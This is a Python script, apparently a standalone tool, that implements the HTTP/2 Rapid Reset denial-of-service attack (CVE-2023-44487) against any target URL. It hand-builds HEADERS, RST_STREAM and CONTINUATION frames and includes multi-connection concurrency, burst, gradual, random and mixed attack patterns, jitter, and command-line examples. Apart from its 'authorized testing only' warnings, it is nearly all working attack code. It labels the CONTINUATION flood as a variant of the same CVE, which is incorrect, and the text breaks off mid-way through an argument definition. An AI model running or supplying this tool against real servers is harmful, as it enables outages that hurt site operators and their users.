#!/usr/bin/env python3
"""
CVE-2023-44487 HTTP/2 Rapid Reset Attack Testing Tool - Enhanced Version

This script implements a comprehensive test for the HTTP/2 Rapid Reset vulnerability (CVE-2023-44487).
The vulnerability involves sending a large number of HTTP/2 stream requests followed
immediately by RST_STREAM frames to overwhelm the server.

WARNING: This tool is for educational and authorized testing purposes only.
Only use this against systems you own or have explicit permission to test.

Author: Madhusudhan
License: MIT
"""

import argparse
import asyncio
import ssl
import socket
import struct
import time
import sys
import logging
import json
import csv
import random
import os
from typing import Optional, List, Tuple, Dict, Any
from dataclasses import dataclass, asdict
from urllib.parse import urlparse
from enum import Enum

# HTTP/2 Frame Types
FRAME_TYPE_DATA = 0x0
FRAME_TYPE_HEADERS = 0x1
FRAME_TYPE_PRIORITY = 0x2
FRAME_TYPE_RST_STREAM = 0x3
FRAME_TYPE_SETTINGS = 0x4
FRAME_TYPE_PUSH_PROMISE = 0x5
FRAME_TYPE_PING = 0x6
FRAME_TYPE_GOAWAY = 0x7
FRAME_TYPE_WINDOW_UPDATE = 0x8
FRAME_TYPE_CONTINUATION = 0x9

# HTTP/2 Frame Flags
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
FLAG_PADDED = 0x8
FLAG_PRIORITY = 0x20

# HTTP/2 Settings
SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

# HTTP/2 Error Codes
ERROR_NO_ERROR = 0x0
ERROR_PROTOCOL_ERROR = 0x1
ERROR_INTERNAL_ERROR = 0x2
ERROR_FLOW_CONTROL_ERROR = 0x3
ERROR_SETTINGS_TIMEOUT = 0x4
ERROR_STREAM_CLOSED = 0x5
ERROR_FRAME_SIZE_ERROR = 0x6
ERROR_REFUSED_STREAM = 0x7
ERROR_CANCEL = 0x8

# HTTP/2 Connection Preface
HTTP2_CONNECTION_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

class AttackPattern(Enum):
    """Different attack patterns for testing"""
    RAPID_RESET = "rapid_reset"
    BURST_RESET = "burst_reset"
    GRADUAL_RESET = "gradual_reset"
    RANDOM_RESET = "random_reset"
    CONTINUATION_FLOOD = "continuation_flood"
    MIXED_PATTERN = "mixed_pattern"

class OutputFormat(Enum):
    """Output format options"""
    CONSOLE = "console"
    JSON = "json"
    CSV = "csv"
    XML = "xml"

@dataclass
class AttackConfig:
    """Configuration for attack parameters"""
    # Connection settings
    max_connections: int = 1
    connection_timeout: int = 10
    read_timeout: int = 5
    keep_alive: bool = True
    
    # Request settings
    requests_per_connection: int = 100
    burst_size: int = 10
    burst_delay: float = 0.1
    
    # Timing controls
    delay_between_headers_rst: float = 0.001
    delay_between_requests: float = 0.0
    delay_between_connections: float = 0.0
    jitter_factor: float = 0.0
    
    # Protocol settings
    http2_window_size: int = 65535
    max_frame_size: int = 16384
    enable_push: bool = False
    header_table_size: int = 4096
    
    # Attack pattern
    attack_pattern: AttackPattern = AttackPattern.RAPID_RESET
    randomize_stream_ids: bool = False
    include_priority_frames: bool = False
    
    # Headers customization
    custom_headers: Dict[str, str] = None
    random_headers: bool = False
    header_count: int = 5
    
    # Error handling
    rst_error_code: int = ERROR_CANCEL
    continue_on_error: bool = True
    max_errors: int = 10
    
    # Monitoring
    enable_latency_tracking: bool = False
    track_server_responses: bool = False
    monitor_memory_usage: bool = False

@dataclass
class ConnectionStats:
    """Statistics for a single connection"""
    connection_id: int
    successful_connects: int = 0
    failed_connects: int = 0
    successful_attacks: int = 0
    failed_attacks: int = 0
    total_bytes_sent: int = 0
    total_bytes_received: int = 0
    average_latency: float = 0.0
    errors: List[str] = None
    start_time: float = 0.0
    end_time: float = 0.0
    
    def __post_init__(self):
        if self.errors is None:
            self.errors = []

@dataclass
class HTTP2Frame:
    """Represents an HTTP/2 frame"""
    length: int
    frame_type: int
    flags: int
    stream_id: int
    payload: bytes

    def to_bytes(self) -> bytes:
        """Convert frame to bytes for transmission"""
        header = struct.pack('!I', (self.length << 8) | self.frame_type)
        header += struct.pack('!BI', self.flags, self.stream_id & 0x7FFFFFFF)
        return header + self.payload

class HTTP2Connection:
    """Enhanced HTTP/2 connection handler with granular controls"""
    
    def __init__(self, host: str, port: int, use_ssl: bool, config: AttackConfig):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.config = config
        self.socket = None
        self.stream_id = 1
        self.settings_received = False
        self.max_concurrent_streams = 100
        self.stats = None
        self.start_time = 0
        
    async def connect(self, connection_id: int) -> bool:
        """Establish connection and perform HTTP/2 handshake"""
        self.stats = ConnectionStats(connection_id=connection_id)
        self.start_time = time.time()
        self.stats.start_time = self.start_time
        
        try:
            # Create socket connection
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.config.connection_timeout)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.set_alpn_protocols(['h2'])
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Configure SSL options based on config
                if hasattr(context, 'minimum_version'):
                    context.minimum_version = ssl.TLSVersion.TLSv1_2
                
                self.socket = context.wrap_socket(self.socket, server_hostname=self.host)
            
            await asyncio.get_event_loop().run_in_executor(
                None, self.socket.connect, (self.host, self.port)
            )
            
            self.stats.successful_connects = 1
            
            # Send HTTP/2 connection preface
            await self._send_raw(HTTP2_CONNECTION_PREFACE)
            
            # Send initial SETTINGS frame with custom configuration
            await self._send_settings()
            
            # Wait for server's SETTINGS frame
            await self._read_settings_response()
            
            return True
            
        except Exception as e:
            logging.error(f"Connection {connection_id} failed: {e}")
            self.stats.failed_connects = 1
            self.stats.errors.append(f"Connection failed: {str(e)}")
            return False
    
    async def _send_raw(self, data: bytes):
        """Send raw bytes over the connection"""
        await asyncio.get_event_loop().run_in_executor(
            None, self.socket.send, data
        )
        self.stats.total_bytes_sent += len(data)
    
    async def _send_frame(self, frame: HTTP2Frame):
        """Send an HTTP/2 frame"""
        frame_data = frame.to_bytes()
        await self._send_raw(frame_data)
        
        if logging.getLogger().isEnabledFor(logging.DEBUG):
            logging.debug(f"Sent frame: type={frame.frame_type}, stream_id={frame.stream_id}, length={frame.length}")
    
    async def _send_settings(self):
        """Send initial SETTINGS frame with custom configuration"""
        settings = b''
        
        # Configure settings based on attack config
        settings += struct.pack('!HI', SETTINGS_ENABLE_PUSH, 1 if self.config.enable_push else 0)
        settings += struct.pack('!HI', SETTINGS_MAX_CONCURRENT_STREAMS, 1000)
        settings += struct.pack('!HI', SETTINGS_INITIAL_WINDOW_SIZE, self.config.http2_window_size)
        settings += struct.pack('!HI', SETTINGS_MAX_FRAME_SIZE, self.config.max_frame_size)
        settings += struct.pack('!HI', SETTINGS_HEADER_TABLE_SIZE, self.config.header_table_size)
        
        frame = HTTP2Frame(
            length=len(settings),
            frame_type=FRAME_TYPE_SETTINGS,
            flags=0,
            stream_id=0,
            payload=settings
        )
        await self._send_frame(frame)
    
    async def _read_settings_response(self):
        """Read and acknowledge server's SETTINGS frame"""
        try:
            self.socket.settimeout(self.config.read_timeout)
            
            # Read frame header (9 bytes)
            header_data = await asyncio.get_event_loop().run_in_executor(
                None, self.socket.recv, 9
            )
            
            if len(header_data) < 9:
                return
            
            self.stats.total_bytes_received += len(header_data)
            
            # Parse frame header
            length_and_type = struct.unpack('!I', header_data[:4])[0]
            length = length_and_type >> 8
            frame_type = length_and_type & 0xFF
            flags, stream_id = struct.unpack('!BI', header_data[4:])
            
            # Read payload if present
            payload = b''
            if length > 0:
                payload = await asyncio.get_event_loop().run_in_executor(
                    None, self.socket.recv, length
                )
                self.stats.total_bytes_received += len(payload)
            
            # If it's a SETTINGS frame, send ACK
            if frame_type == FRAME_TYPE_SETTINGS and not (flags & FLAG_ACK):
                ack_frame = HTTP2Frame(
                    length=0,
                    frame_type=FRAME_TYPE_SETTINGS,
                    flags=FLAG_ACK,
                    stream_id=0,
                    payload=b''
                )
                await self._send_frame(ack_frame)
                self.settings_received = True
                
                # Parse settings to get max concurrent streams
                self._parse_settings(payload)
                
        except Exception as e:
            logging.warning(f"Error reading settings response: {e}")
            self.stats.errors.append(f"Settings response error: {str(e)}")
    
    def _parse_settings(self, payload: bytes):
        """Parse SETTINGS frame payload"""
        offset = 0
        while offset < len(payload):
            if offset + 6 <= len(payload):
                setting_id, value = struct.unpack('!HI', payload[offset:offset+6])
                if setting_id == SETTINGS_MAX_CONCURRENT_STREAMS:
                    self.max_concurrent_streams = min(value, 1000)  # Cap at 1000 for safety
                offset += 6
            else:
                break
    
    def _generate_headers(self, path: str = '/') -> List[Tuple[bytes, bytes]]:
        """Generate headers based on configuration"""
        # Build pseudo-headers (required for HTTP/2)
        headers = [
            (b':method', b'GET'),
            (b':path', path.encode('utf-8')),
            (b':scheme', b'https' if self.use_ssl else b'http'),
            (b':authority', self.host.encode('utf-8'))
        ]
        
        # Add custom headers if provided
        if self.config.custom_headers:
            for name, value in self.config.custom_headers.items():
                headers.append((name.encode('utf-8'), value.encode('utf-8')))
        
        # Add random headers if enabled
        if self.config.random_headers:
            for i in range(self.config.header_count):
                header_name = f'x-test-header-{i}'
                header_value = f'test-value-{random.randint(1000, 9999)}'
                headers.append((header_name.encode('utf-8'), header_value.encode('utf-8')))
        
        return headers
    
    async def send_headers_frame(self, path: str = '/', include_priority: bool = False) -> int:
        """Send a HEADERS frame and return the stream ID"""
        current_stream_id = self.stream_id
        
        if self.config.randomize_stream_ids:
            # Generate random odd stream ID (client streams must be odd)
            self.stream_id = random.randrange(1, 2147483647, 2)
        else:
            self.stream_id += 2  # Client streams are odd numbers
        
        headers = self._generate_headers(path)
        
        # Simple HPACK encoding (literal header field without indexing)
        payload = b''
        for name, value in headers:
            # Format: 0xxxxxxx (literal header field without indexing)
            payload += b'\x00'  # No indexing, new name
            payload += struct.pack('!B', len(name)) + name
            payload += struct.pack('!B', len(value)) + value
        
        flags = FLAG_END_HEADERS | FLAG_END_STREAM
        if include_priority and self.config.include_priority_frames:
            flags |= FLAG_PRIORITY
            # Add priority data: dependency (4 bytes) + weight (1 byte)
            priority_data = struct.pack('!IB', 0, 16)  # No dependency, weight 16
            payload = priority_data + payload
        
        frame = HTTP2Frame(
            length=len(payload),
            frame_type=FRAME_TYPE_HEADERS,
            flags=flags,
            stream_id=current_stream_id,
            payload=payload
        )
        
        await self._send_frame(frame)
        return current_stream_id
    
    async def send_rst_stream(self, stream_id: int, error_code: int = None):
        """Send a RST_STREAM frame"""
        if error_code is None:
            error_code = self.config.rst_error_code
            
        payload = struct.pack('!I', error_code)
        frame = HTTP2Frame(
            length=4,
            frame_type=FRAME_TYPE_RST_STREAM,
            flags=0,
            stream_id=stream_id,
            payload=payload
        )
        await self._send_frame(frame)
    
    async def send_continuation_flood(self, stream_id: int, num_frames: int = 10):
        """Send CONTINUATION frames without END_HEADERS (for CONTINUATION flood attack)"""
        for i in range(num_frames):
            # Create dummy header data
            dummy_header = f'x-continuation-{i}: value-{i}'
            payload = b'\x00' + struct.pack('!B', len(dummy_header.split(':')[0])) + \
                     dummy_header.split(':')[0].encode() + \
                     struct.pack('!B', len(dummy_header.split(':')[1].strip())) + \
                     dummy_header.split(':')[1].strip().encode()
            
            flags = 0  # No END_HEADERS flag - this creates the vulnerability
            if i == num_frames - 1:  # Only set END_HEADERS on last frame
                flags = FLAG_END_HEADERS
            
            frame = HTTP2Frame(
                length=len(payload),
                frame_type=FRAME_TYPE_CONTINUATION,
                flags=flags,
                stream_id=stream_id,
                payload=payload
            )
            await self._send_frame(frame)
    
    async def execute_attack_pattern(self) -> int:
        """Execute the configured attack pattern"""
        successful_attacks = 0
        error_count = 0
        
        logging.info(f"Executing {self.config.attack_pattern.value} pattern with {self.config.requests_per_connection} requests")
        
        if self.config.attack_pattern == AttackPattern.RAPID_RESET:
            successful_attacks = await self._rapid_reset_attack()
        elif self.config.attack_pattern == AttackPattern.BURST_RESET:
            successful_attacks = await self._burst_reset_attack()
        elif self.config.attack_pattern == AttackPattern.GRADUAL_RESET:
            successful_attacks = await self._gradual_reset_attack()
        elif self.config.attack_pattern == AttackPattern.RANDOM_RESET:
            successful_attacks = await self._random_reset_attack()
        elif self.config.attack_pattern == AttackPattern.CONTINUATION_FLOOD:
            successful_attacks = await self._continuation_flood_attack()
        elif self.config.attack_pattern == AttackPattern.MIXED_PATTERN:
            successful_attacks = await self._mixed_pattern_attack()
        
        return successful_attacks
    
    async def _rapid_reset_attack(self) -> int:
        """Standard rapid reset attack"""
        successful_attacks = 0
        
        for i in range(self.config.requests_per_connection):
            try:
                request_start = time.time()
                
                # Send HEADERS frame
                stream_id = await self.send_headers_frame('/')
                
                # Apply jitter if configured
                delay = self.config.delay_between_headers_rst
                if self.config.jitter_factor > 0:
                    jitter = random.uniform(-self.config.jitter_factor, self.config.jitter_factor)
                    delay = max(0, delay + jitter)
                
                if delay > 0:
                    await asyncio.sleep(delay)
                
                # Send RST_STREAM to cancel the request
                await self.send_rst_stream(stream_id)
                
                # Track latency if enabled
                if self.config.enable_latency_tracking:
                    latency = time.time() - request_start
                    self.stats.average_latency = (self.stats.average_latency * successful_attacks + latency) / (successful_attacks + 1)
                
                successful_attacks += 1
                self.stats.successful_attacks = successful_attacks
                
                # Delay between requests if configured
                if self.config.delay_between_requests > 0:
                    await asyncio.sleep(self.config.delay_between_requests)
                
                if (i + 1) % 10 == 0:
                    logging.debug(f"Completed {i + 1}/{self.config.requests_per_connection} rapid reset cycles")
                
            except Exception as e:
                logging.error(f"Error in rapid reset cycle {i}: {e}")
                self.stats.failed_attacks += 1
                self.stats.errors.append(f"Attack cycle {i}: {str(e)}")
                
                if not self.config.continue_on_error:
                    break
                
                error_count += 1
                if error_count >= self.config.max_errors:
                    logging.error(f"Maximum error count ({self.config.max_errors}) reached, stopping attack")
                    break
        
        return successful_attacks
    
    async def _burst_reset_attack(self) -> int:
        """Send requests in bursts with delays between bursts"""
        successful_attacks = 0
        total_requests = self.config.requests_per_connection
        
        for burst_start in range(0, total_requests, self.config.burst_size):
            burst_end = min(burst_start + self.config.burst_size, total_requests)
            
            # Send burst of requests
            for i in range(burst_start, burst_end):
                try:
                    stream_id = await self.send_headers_frame('/')
                    await asyncio.sleep(self.config.delay_between_headers_rst)
                    await self.send_rst_stream(stream_id)
                    successful_attacks += 1
                except Exception as e:
                    logging.error(f"Error in burst attack cycle {i}: {e}")
                    self.stats.errors.append(f"Burst cycle {i}: {str(e)}")
            
            # Delay between bursts
            if burst_end < total_requests and self.config.burst_delay > 0:
                await asyncio.sleep(self.config.burst_delay)
        
        return successful_attacks
    
    async def _gradual_reset_attack(self) -> int:
        """Gradually increase the rate of attacks"""
        successful_attacks = 0
        
        for i in range(self.config.requests_per_connection):
            try:
                stream_id = await self.send_headers_frame('/')
                
                # Gradually decrease delay
                progress = i / self.config.requests_per_connection
                delay = self.config.delay_between_headers_rst * (1 - progress)
                
                if delay > 0:
                    await asyncio.sleep(delay)
                
                await self.send_rst_stream(stream_id)
                successful_attacks += 1
                
            except Exception as e:
                logging.error(f"Error in gradual attack cycle {i}: {e}")
                self.stats.errors.append(f"Gradual cycle {i}: {str(e)}")
        
        return successful_attacks
    
    async def _random_reset_attack(self) -> int:
        """Random timing between requests"""
        successful_attacks = 0
        
        for i in range(self.config.requests_per_connection):
            try:
                stream_id = await self.send_headers_frame('/')
                
                # Random delay
                delay = random.uniform(0, self.config.delay_between_headers_rst * 2)
                await asyncio.sleep(delay)
                
                await self.send_rst_stream(stream_id)
                successful_attacks += 1
                
            except Exception as e:
                logging.error(f"Error in random attack cycle {i}: {e}")
                self.stats.errors.append(f"Random cycle {i}: {str(e)}")
        
        return successful_attacks
    
    async def _continuation_flood_attack(self) -> int:
        """CONTINUATION flood attack (CVE-2023-44487 variant)"""
        successful_attacks = 0
        
        for i in range(self.config.requests_per_connection):
            try:
                # Send HEADERS frame without END_HEADERS
                stream_id = await self.send_headers_frame('/')
                
                # Send multiple CONTINUATION frames
                await self.send_continuation_flood(stream_id, 5)
                
                successful_attacks += 1
                
            except Exception as e:
                logging.error(f"Error in continuation flood cycle {i}: {e}")
                self.stats.errors.append(f"Continuation cycle {i}: {str(e)}")
        
        return successful_attacks
    
    async def _mixed_pattern_attack(self) -> int:
        """Mix different attack patterns"""
        successful_attacks = 0
        patterns = [self._rapid_reset_attack, self._burst_reset_attack, self._gradual_reset_attack]
        
        # Split requests among different patterns
        requests_per_pattern = self.config.requests_per_connection // len(patterns)
        
        for pattern_func in patterns:
            # Temporarily adjust request count for this pattern
            original_requests = self.config.requests_per_connection
            self.config.requests_per_connection = requests_per_pattern
            
            pattern_attacks = await pattern_func()
            successful_attacks += pattern_attacks
            
            # Restore original request count
            self.config.requests_per_connection = original_requests
        
        return successful_attacks
    
    def close(self):
        """Close the connection"""
        self.stats.end_time = time.time()
        if self.socket:
            self.socket.close()

class RapidResetTester:
    """Enhanced main testing class with granular controls"""
    
    def __init__(self, target_url: str, config: AttackConfig):
        self.target_url = target_url
        self.config = config
        
        # Parse URL
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.use_ssl = parsed.scheme == 'https'
        
        if not self.host:
            raise ValueError("Invalid URL provided")
        
        self.results = []
    
    async def test_single_connection(self, connection_id: int) -> Tuple[bool, ConnectionStats]:
        """Test a single connection with detailed statistics"""
        logging.info(f"Connection {connection_id}: Establishing HTTP/2 connection to {self.host}:{self.port}")
        
        conn = HTTP2Connection(self.host, self.port, self.use_ssl, self.config)
        
        try:
            # Delay between connections if configured
            if connection_id > 1 and self.config.delay_between_connections > 0:
                await asyncio.sleep(self.config.delay_between_connections)
            
            # Establish connection
            if not await conn.connect(connection_id):
                logging.error(f"Connection {connection_id}: Failed to establish connection")
                return False, conn.stats
            
            logging.info(f"Connection {connection_id}: HTTP/2 connection established")
            
            # Execute attack pattern
            successful_attacks = await conn.execute_attack_pattern()
            
            logging.info(f"Connection {connection_id}: Completed {successful_attacks}/{self.config.requests_per_connection} attacks")
            
            return True, conn.stats
            
        except Exception as e:
            logging.error(f"Connection {connection_id}: Error during test: {e}")
            if conn.stats:
                conn.stats.errors.append(f"Connection error: {str(e)}")
            return False, conn.stats or ConnectionStats(connection_id=connection_id)
            
        finally:
            conn.close()
    
    async def run_test(self) -> Dict[str, Any]:
        """Run the complete test with enhanced reporting"""
        logging.info(f"Starting CVE-2023-44487 test against {self.target_url}")
        logging.info(f"Attack pattern: {self.config.attack_pattern.value}")
        logging.info(f"Configuration: {self.config.max_connections} connections, {self.config.requests_per_connection} requests per connection")
        
        start_time = time.time()
        
        # Run connections with concurrency control
        tasks = []
        semaphore = asyncio.Semaphore(min(self.config.max_connections, 50))  # Limit concurrent tasks
        
        async def run_connection_with_semaphore(conn_id):
            async with semaphore:
                return await self.test_single_connection(conn_id)
        
        for i in range(self.config.max_connections):
            task = asyncio.create_task(run_connection_with_semaphore(i + 1))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Analyze results
        connection_stats = []
        successful_connections = 0
        total_successful_attacks = 0
        total_failed_attacks = 0
        total_bytes_sent = 0
        total_bytes_received = 0
        total_errors = []
        average_latency = 0
        latency_samples = 0
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                logging.error(f"Connection {i + 1}: Exception occurred: {result}")
                total_errors.append(f"Connection {i + 1}: {str(result)}")
            else:
                success, stats = result
                connection_stats.append(stats)
                
                if success:
                    successful_connections += 1
                
                total_successful_attacks += stats.successful_attacks
                total_failed_attacks += stats.failed_attacks
                total_bytes_sent += stats.total_bytes_sent
                total_bytes_received += stats.total_bytes_received
                total_errors.extend(stats.errors)
                
                if self.config.enable_latency_tracking and stats.average_latency > 0:
                    average_latency = (average_latency * latency_samples + stats.average_latency) / (latency_samples + 1)
                    latency_samples += 1
        
        # Calculate statistics
        total_intended_requests = self.config.max_connections * self.config.requests_per_connection
        success_rate = (total_successful_attacks / total_intended_requests) * 100 if total_intended_requests > 0 else 0
        requests_per_second = total_successful_attacks / duration if duration > 0 else 0
        
        test_results = {
            'target_url': self.target_url,
            'test_config': asdict(self.config),
            'test_summary': {
                'duration': duration,
                'successful_connections': successful_connections,
                'total_connections': self.config.max_connections,
                'total_successful_attacks': total_successful_attacks,
                'total_failed_attacks': total_failed_attacks,
                'total_intended_requests': total_intended_requests,
                'success_rate': success_rate,
                'requests_per_second': requests_per_second,
                'total_bytes_sent': total_bytes_sent,
                'total_bytes_received': total_bytes_received,
                'average_latency': average_latency if self.config.enable_latency_tracking else None,
                'error_count': len(total_errors)
            },
            'connection_stats': [asdict(stats) for stats in connection_stats],
            'errors': total_errors,
            'timestamp': time.time()
        }
        
        return test_results

def print_banner():
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                CVE-2023-44487 Rapid Reset Tester - Enhanced         ║
║                                                                      ║
║  Advanced HTTP/2 Rapid Reset Attack Testing Tool                    ║
║  WARNING: For authorized testing only!                              ║
╚══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def save_results(results: dict, output_format: OutputFormat, filename: str = None):
    """Save results in the specified format"""
    if filename is None:
        timestamp = int(time.time())
        filename = f"rapid_reset_results_{timestamp}"
    
    if output_format == OutputFormat.JSON:
        filename += ".json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, default=str)
    
    elif output_format == OutputFormat.CSV:
        filename += ".csv"
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            
            # Write summary
            writer.writerow(['Metric', 'Value'])
            for key, value in results['test_summary'].items():
                writer.writerow([key, value])
            
            writer.writerow([])  # Empty row
            
            # Write connection stats
            if results['connection_stats']:
                writer.writerow(['Connection Stats'])
                if results['connection_stats']:
                    headers = list(results['connection_stats'][0].keys())
                    writer.writerow(headers)
                    for stats in results['connection_stats']:
                        writer.writerow([stats.get(h, '') for h in headers])
    
    elif output_format == OutputFormat.XML:
        filename += ".xml"
        # Simple XML output (can be enhanced)
        with open(filename, 'w') as f:
            f.write('<?xml version="1.0" encoding="UTF-8"?>\n')
            f.write('<rapid_reset_results>\n')
            f.write(f'  <target_url>{results["target_url"]}</target_url>\n')
            f.write('  <test_summary>\n')
            for key, value in results['test_summary'].items():
                f.write(f'    <{key}>{value}</{key}>\n')
            f.write('  </test_summary>\n')
            f.write('</rapid_reset_results>\n')
    
    print(f"Results saved to: {filename}")

def print_results(results: dict, verbose: bool = False):
    """Print test results with enhanced formatting"""
    print("\n" + "="*70)
    print("ENHANCED TEST RESULTS")
    print("="*70)
    
    summary = results['test_summary']
    config = results['test_config']
    
    print(f"Target URL:               {results['target_url']}")
    print(f"Attack Pattern:           {config['attack_pattern']}")
    print(f"Connections:              {summary['total_connections']}")
    print(f"Requests per connection:  {config['requests_per_connection']}")
    print(f"Successful connections:   {summary['successful_connections']}")
    print(f"Total successful attacks: {summary['total_successful_attacks']}")
    print(f"Total failed attacks:     {summary['total_failed_attacks']}")
    print(f"Total intended requests:  {summary['total_intended_requests']}")
    print(f"Success rate:             {summary['success_rate']:.2f}%")
    print(f"Duration:                 {summary['duration']:.2f} seconds")
    print(f"Requests per second:      {summary['requests_per_second']:.2f}")
    print(f"Total bytes sent:         {summary['total_bytes_sent']:,}")
    print(f"Total bytes received:     {summary['total_bytes_received']:,}")
    
    if summary.get('average_latency') is not None:
        print(f"Average latency:          {summary['average_latency']:.4f} seconds")
    
    if summary['error_count'] > 0:
        print(f"Total errors:             {summary['error_count']}")
    
    if verbose and results.get('connection_stats'):
        print("\n" + "-"*50)
        print("PER-CONNECTION STATISTICS")
        print("-"*50)
        for stats in results['connection_stats']:
            print(f"Connection {stats['connection_id']}:")
            print(f"  Successful attacks: {stats['successful_attacks']}")
            print(f"  Failed attacks: {stats['failed_attacks']}")
            print(f"  Bytes sent: {stats['total_bytes_sent']:,}")
            print(f"  Bytes received: {stats['total_bytes_received']:,}")
            if stats.get('average_latency', 0) > 0:
                print(f"  Average latency: {stats['average_latency']:.4f}s")
            if stats.get('errors'):
                print(f"  Errors: {len(stats['errors'])}")
    
    print("="*70)

def create_config_from_args(args) -> AttackConfig:
    """Create AttackConfig from command line arguments"""
    config = AttackConfig()
    
    # Basic settings
    config.max_connections = args.connections
    config.requests_per_connection = args.requests
    config.connection_timeout = args.connection_timeout
    config.read_timeout = args.read_timeout
    
    # Timing controls
    config.delay_between_headers_rst = args.delay
    config.delay_between_requests = args.request_delay
    config.delay_between_connections = args.connection_delay
    config.jitter_factor = args.jitter
    
    # Attack pattern
    if hasattr(args, 'pattern') and args.pattern:
        config.attack_pattern = AttackPattern(args.pattern)
    
    # Protocol settings
    config.http2_window_size = args.window_size
    config.max_frame_size = args.frame_size
    config.enable_push = args.enable_push
    config.header_table_size = args.header_table_size
    
    # Burst settings
    config.burst_size = args.burst_size
    config.burst_delay = args.burst_delay
    
    # Headers
    if args.custom_headers:
        config.custom_headers = {}
        for header in args.custom_headers:
            if ':' in header:
                name, value = header.split(':', 1)
                config.custom_headers[name.strip()] = value.strip()
    
    config.random_headers = args.random_headers
    config.header_count = args.header_count
    
    # Advanced options
    config.randomize_stream_ids = args.randomize_streams
    config.include_priority_frames = args.priority_frames
    config.rst_error_code = args.rst_error_code
    config.continue_on_error = args.continue_on_error
    config.max_errors = args.max_errors
    
    # Monitoring
    config.enable_latency_tracking = args.track_latency
    config.track_server_responses = args.track_responses
    config.monitor_memory_usage = args.monitor_memory
    
    return config

def setup_logging(verbose: bool = False, debug: bool = False, log_file: str = None):
    """Setup enhanced logging configuration"""
    if debug:
        level = logging.DEBUG
    elif verbose:
        level = logging.INFO
    else:
        level = logging.WARNING
    
    # Create formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    
    # Configure root logger
    logging.basicConfig(level=level, handlers=[console_handler])
    
    # File handler if specified
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(formatter)
        logging.getLogger().addHandler(file_handler)

async def main():
    """Enhanced main function with comprehensive options"""
    parser = argparse.ArgumentParser(
        description='CVE-2023-44487 HTTP/2 Rapid Reset Attack Testing Tool - Enhanced Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Patterns:
  rapid_reset     - Standard rapid reset (HEADERS + immediate RST_STREAM)
  burst_reset     - Send requests in bursts with delays between bursts
  gradual_reset   - Gradually increase attack rate
  random_reset    - Random timing between requests
  continuation_flood - CONTINUATION frame flood attack
  mixed_pattern   - Mix of different patterns

Output Formats:
  console         - Standard console output (default)
  json           - JSON format output
  csv            - CSV format output
  xml            - XML format output

Examples:
  # Basic test
  python rapid_reset_test.py https://example.com

  # Advanced burst attack with custom headers
  python rapid_reset_test.py https://example.com \\
    --pattern burst_reset --burst-size 20 --burst-delay 0.5 \\
    --custom-headers "Authorization: Bearer token" "X-API-Key: key123"

  # High-throughput test with monitoring
  python rapid_reset_test.py https://example.com \\
    --connections 10 --requests 500 --delay 0 \\
    --track-latency --monitor-memory --output json

  # CONTINUATION flood attack
  python rapid_reset_test.py https://example.com \\
    --pattern continuation_flood --requests 50

WARNING: This tool is for educational and authorized testing purposes only.
        """
    )
    
    # Basic arguments
    parser.add_argument('url', help='Target URL (e.g., https://example.com)')
    
    # Connection settings
    conn_group = parser.add_argument_group('Connection Settings')
    conn_group.add_argument('-c', '--connections', type=int, default=1, metavar='N',
                           help='Number of concurrent connections (default: 1, max: 100)')
    conn_group.add_argument('--connection-timeout', type=int, default=10, metavar='SEC',
                           help='Connection timeout in seconds (default: 10)')
    conn_group.add_argument('--read-timeout', type=int, default=5, metavar='SEC',
                           help='Read timeout in seconds (default: 5)')
    conn_group.add_argument('--connection-delay', type=float, default=0.0, metavar='SEC',
                           help='Delay between establishing connections (default: 0.0)')
    
    # Request settings
    req_group = parser.add_argument_group('Request Settings')
    req_group.add_argument('-r', '--requests', type=int, default=100, metavar='N',
                          help='Number of requests per connection (default: 100, max: 10000)')
    req_group.add_argument('--delay', type=float, default=0.001, metavar='SEC',
                          help='Delay between HEADERS and RST_STREAM frames (default: 0.001)')
    req_group.add_argument('--request-delay', type=float, default=0.0, metavar='SEC',
                          help='Delay between individual requests (default: 0.0)')
    req_group.add_argument('--jitter', type=float, default=0.0, metavar='FACTOR',
                          help='Jitter factor for timing randomization (default: 0.0)')
    
    # Attack patterns
    pattern_group = parser.add_argument_group('Attack Patterns')
    pattern_group.add_argument('--pattern', choices=[p.value for p in AttackPattern],
                              default='rapid_reset',
                              help='Attack pattern to use (default: rapid_reset)')
    pattern_group.add_argument('--burst-size', type=int, default=10, metavar='N',
                              help='Number of requests per burst (default: 10)')
    pattern_group.add_argument('--burst-delay', type=float, default=0.1, metavar='SEC',
                              help='Delay between bursts (default: 0.1)')
    
    # Protocol settings
    proto_group = parser.add_argument_group('HTTP/2 Protocol Settings')
    proto_group.add_argument('--window-size', type=int, default=65535, metavar='BYTES',
                            help='HTTP/2 initial window size (default: 65535)')
    proto_group.add_argument('--frame-size', type=int, default=16384, metavar='BYTES',
                            help='HTTP/2 max frame size (default: 16384)')
    proto_group.add_argument('--header-table-size', type=int, default=4096, metavar='BYTES',
                            help='HPACK header table size (default: 4096)')
    proto_group.add_argument('--enable-push', action='store_true',
                            help='Enable HTTP/2 server push')
    proto_group.add_argument('--rst-error-code', type=int, default=8, metavar='CODE',
